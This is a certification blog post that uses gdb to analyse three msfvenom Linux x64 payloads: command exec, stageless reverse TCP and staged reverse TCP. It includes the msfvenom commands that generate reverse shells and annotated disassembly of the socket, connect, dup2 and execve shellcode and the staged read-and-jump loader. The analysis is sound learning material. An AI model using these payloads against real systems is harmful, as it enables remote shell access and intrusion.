---
layout: post
title:  SLAE64 Assignment 5 - msfvenom shellcode analysis with gdb 
excerpt: analysis of code generated by msfvenom for payloads linux/x64/exec linux/x64/shell/reverse_tcp and linux/x64/shell_reverse_tcp
---

because the assignment asks to analyze using gdb, i will not use objdump, ndisasm or any other tool  
because i'm using gdb+gef 8.3, i can use the command "starti" that start the executable and interrupt at the very first call and analyze the code.


## exec
payload generated with: msfvenom -p linux/x64/exec -f elf CMD=whoami > 05-exec

the journey starts with a:
    gdb ./05-exec
    starti

i can now run vmmap, grep, and x/ to analyze the program   
vmmap for example show that 0x400000 is rwx  
and x/20i 0x400078 (where 0x400078 is starting point) shows us what looks like the main letting us to analyze without actually running it:

    gef➤  x/20i 0x400078
    ; this could be the syscall id, 0x3b is sys_execve
    => 0x400078:    push   0x3b
    ; and it's placed on rax
    0x40007a:    pop    rax
    ; basing on my former analysis, cdq will also zero edx. not useful to me in 64bit
    0x40007b:    cdq
    ; place in rbx the string /bin/sh (with a null!)
    0x40007c:    movabs rbx,0x68732f6e69622f
    ; push it on the stack
    0x400086:    push   rbx
    ; and put a pointer to /bin/sh in rdi. this is required for execve syscall
    0x400087:    mov    rdi,rsp
    ; rsi will hold arguments, therefore the code pushes -c to have
    ; executed: /bin/sh -c
    0x40008a:    push   0x632d
    0x40008f:    mov    rsi,rsp
    0x400092:    push   rdx
    ; i saw this call also on 32bit release, and i loved it. this fools
    ; linear disassembler. let's skip everything and do a x/20i 0x40009f
    0x400093:    call   0x40009f
    0x400098:    ja     0x400102
    0x40009a:    outs   dx,DWORD PTR ds:[rsi]
    0x40009b:    (bad)
    0x40009c:    ins    DWORD PTR es:[rdi],dx
    0x40009d:    imul   eax,DWORD PTR [rax],0x89485756
    0x4000a3:    out    0xf,al
    0x4000a5:    add    eax,0x0
    0x4000aa:    add    BYTE PTR [rax],al
    0x4000ac:    add    BYTE PTR [rax],al
    0x4000ae:    add    BYTE PTR [rax],al


let's explore 0x40009f:

    gef➤  x/20i 0x40009f
    ; the call moves RIP here. we see that something from rsi is pushed, rsi
    ; was -c. also rdi is pushed, and we know that rdi was a pointer to
    ; /bin/sh
    0x40009f:    push   rsi
    0x4000a0:    push   rdi
    ; then, a pointer to the command is placed at rsi that holds arguments
    0x4000a1:    mov    rsi,rsp
    ; we expect that /bin/sh -c is runt here, because we don't see anything
    ; else, so i'm running gdb step by step and i actually see that the
    ; stack starts with a string at the first push rsi. skip this analysis
    ; and move
    0x4000a4:    syscall

here is the stack when RIP is at 0x40009f:

    0x00007fffffffe420│+0x0000: 0x0000000000400098  →  0x5600696d616f6877 ("whoami"?)        ← $rsp
    0x00007fffffffe428│+0x0008: 0x0000000000000000
    0x00007fffffffe430│+0x0010: 0x000000000000632d ("-c"?)   ← $rsi
    0x00007fffffffe438│+0x0018: 0x0068732f6e69622f ("/bin/sh"?)      ← $rdi

and at 0x4000a1 (mov rsi,rsp):

    0x00007fffffffe410│+0x0000: 0x00007fffffffe438  →  0x0068732f6e69622f ("/bin/sh"?)       ← $rsp
    0x00007fffffffe418│+0x0008: 0x00007fffffffe430  →  0x000000000000632d ("-c"?)
    0x00007fffffffe420│+0x0010: 0x0000000000400098  →  0x5600696d616f6877 ("whoami"?)
    0x00007fffffffe428│+0x0018: 0x0000000000000000

we clearly see that the code executes /bin/sh -c whoami

reverse stageless
=================
payload generated with: msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f elf > 05-reversetcp_stageless  
journey starts with a:

    gdb ./05-reversetcp_stageless
    starti

reading the first 8 instructions, i see that the sys_socket syscall is created with an AF_INET STREAM (tcp).

    →   0x400078                  push   0x29
        0x40007a                  pop    rax
        0x40007b                  cdq
        0x40007c                  push   0x2
        0x40007e                  pop    rdi
        0x40007f                  push   0x1
        0x400081                  pop    rsi
        0x400082                  syscall

should be safe to run until 0x400082, so i just b *0x400082 and c

    just after the syscall, we can see another one is prepared:
    ; everything starts by saving rax to rdi, for socket syscall rax will
    ; hold socket file descriptor that is needed to interact with socket
    ; itself
    0x400084:    xchg   rdi,rax
    ; lot of nulls here, a basic "hex2ip" gives a 127.0.0.1 in little endian
    ; just the first 4 bytes are considered here of course for the ip, let's
    ; go down to see what could be that 0x2040002
    ; at 0x400097 i see that 0x2a is the syscallid, that is sys_connect.
    ; i therefore expect rdi as socketfd, rsi as sockaddr struct, and rdx as
    ; addrlen
    ; given that this hex will go to rsi, i can guess that it's the struct.
    ; so: last 0002 will be family, and remaining bytes (d204) the port in
    ; little endian again: 1234
    0x400086:    movabs rcx,0x100007fd2040002
    0x400090:    push   rcx
    0x400091:    mov    rsi,rsp
    ; as said, rds will hold address length, which is 0x10
    0x400094:    push   0x10
    0x400096:    pop    rdx
    ; and the real syscall sys_connect
    0x400097:    push   0x2a
    0x400099:    pop    rax
    0x40009a:    syscall

let's b *0x40009a to easily jump over already analyzed code and c  
following syscall is quite small, analyze line by line:

    ; put 3 in rsi and decrement: like push 0x2
    0x40009c                  push   0x3
    0x40009e                  pop    rsi
    0x40009f                  dec    rsi
    ; place 0x21 in rax, which is sys_dup2 syscall, and do the call for rsi 2 (STDERR)
    0x4000a2                  push   0x21
    0x4000a4                  pop    rax
    0x4000a5                  syscall
    ; this jump occurs, acting as loop by creating the needed fd also for STDOUT and STDIN
    0x4000a7                  jne    0x40009f

after that, we will x/20i 0x4000a9 to see following 20 instructions, that i'll analyze line by line:

    ; 0x3b is our beloved sys_execve, when she's in rax we know something
    ; good (or bad) will happen
    0x4000a9:    push   0x3b
    0x4000ab:    pop    rax
    ; zero stuff again
    0x4000ac:    cdq
    ; move /bin/sh to rbx, that holds binary that will be executed
    0x4000ad:    movabs rbx,0x68732f6e69622f
    0x4000b7:    push   rbx
    ; and place a pointer to rdi
    0x4000b8:    mov    rdi,rsp
    0x4000bb:    push   rdx
    0x4000bc:    push   rdi
    ; prepare arguments, as already discussed for 05-exec
    0x4000bd:    mov    rsi,rsp
    ; and do the call
    0x4000c0:    syscall

reverse staged
==============
payload generated with: msfvenom -p linux/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f elf > 05-reversetcp_staged  
i expect this payload to be more interesting to analyze because of the stager. let's go:

    gdb ./05-reversetcp_staged
    starti

analyze the first 20 instruction, to see what will happen:

    gef➤  x/20i 0x400078
    => 0x400078:    xor    rdi,rdi
    ; 0x9 syscall refers to sys_mmap, let's man it:
    ; void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    ;                ^^ rdi,        ^^ rsi,   ^^ rdx,    ^^ r10,  ^^ r8,        ^^ r9);
    0x40007b:    push   0x9
    0x40007d:    pop    rax
    0x40007e:    cdq
    ; interesting move here, they split dx in dh+dl as saw at 0x40008b
    ; resulting protection will be 1007, that means rwx
    0x40007f:    mov    dh,0x10
    ; and to reuse code, they also put dh (0x10, but it's really 0x1000 so 4096 bytes)
    ; in rdx to specify length
    0x400081:    mov    rsi,rdx
    ; zero offset, to start from the very beginning of already xored rdi
    0x400084:    xor    r9,r9
    ; 0x22 flag could be like 0x20+0x2, that reading from grep -r \ MAP_ /usr/include/
    ; leads to PRIVATE and ANONYMOUS
    0x400087:    push   0x22
    0x400089:    pop    r10
    0x40008b:    mov    dl,0x7
    ; do the actual mmap
    0x40008d:    syscall

after the syscall, i will x/20i 0x40008d:

    ; if everythings ok, go on
    0x40008f:    test   rax,rax
    0x400092:    js     0x4000e5
    0x400094:    push   0xa
    0x400096:    pop    r9
    0x400098:    push   rax
    ; syscall id 0x29 is sys_socket, we can skim this because already
    ; analyzed for the stageless payload
    0x400099:    push   0x29
    0x40009b:    pop    rax
    0x40009c:    cdq
    0x40009d:    push   0x2
    0x40009f:    pop    rdi
    0x4000a0:    push   0x1
    0x4000a2:    pop    rsi
    0x4000a3:    syscall

let's x/20i 0x4000a5 to read the code after syscall:

    ; at 0x4000bd we see that the syscall will be sys_connect. struct is
    ; defined at 0x4000ac and points to 127.0.0.1:1234 as discussed for the
    ; stageless one
    0x4000a5:    test   rax,rax
    0x4000a8:    js     0x4000e5
    0x4000aa:    xchg   rdi,rax
    0x4000ac:    movabs rcx,0x100007fd2040002
    0x4000b6:    push   rcx
    0x4000b7:    mov    rsi,rsp
    0x4000ba:    push   0x10
    0x4000bc:    pop    rdx
    0x4000bd:    push   0x2a
    0x4000bf:    pop    rax
    0x4000c0:    syscall

    ; fast forward to 0x4000c2, and x/20i 0x4000c2:
    ; at 0x4000ce we see that the syscall will be sys_nanosleep
    ; this means that the code will sleep 5 seconds (defined at 0x4000d3)
    ; after the connect
    0x4000c2:    pop    rcx
    0x4000c3:    test   rax,rax
    ; if everithing's fine, go *after* an exit call
    ; else, loop using r9 as counter (set to 0xa at 0x400096) to retry the connection
    0x4000c6:    jns    0x4000ed
    0x4000c8:    dec    r9
    ; and jumps to 0x4000e5 as soon as the connection is established
    0x4000cb:    je     0x4000e5
    0x4000cd:    push   rdi
    0x4000ce:    push   0x23
    0x4000d0:    pop    rax
    0x4000d1:    push   0x0
    0x4000d3:    push   0x5
    0x4000d5:    mov    rdi,rsp
    0x4000d8:    xor    rsi,rsi
    0x4000db:    syscall

looks harmless again, because just waits for something and doesn't "elaborate". yet.
b *0x4000dd after the syscall and x/20i 0x4000dd:

    ; this code basically exit if there is an error, from 0x4000e5 is also used as
    ; neat exit before
    0x4000dd:    pop    rcx
    0x4000de:    pop    rcx
    0x4000df:    pop    rdi
    0x4000e0:    test   rax,rax
    0x4000e3:    jns    0x4000ac
    0x4000e5:    push   0x3c
    0x4000e7:    pop    rax
    0x4000e8:    push   0x1
    0x4000ea:    pop    rdi
    0x4000eb:    syscall
    ; if connect will not raises issue, we land here.
    ; this syscall isactually a read, because rax is 0x0 from last syscall
    ; she reads input from connection and put it at rsi, jumps to 0x4000e5 (neat exit)
    ; if there is any issue or jmp to rsi by executing the code
    0x4000ed:    pop    rsi
    0x4000ee:    push   0x26
    0x4000f0:    pop    rdx
    0x4000f1:    syscall
    0x4000f3:    test   rax,rax
    0x4000f6:    js     0x4000e5
    0x4000f8:    jmp    rsi

this code is not malicious per-se, everything depends on what she receives of course.

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*
*SLAE64-1497*
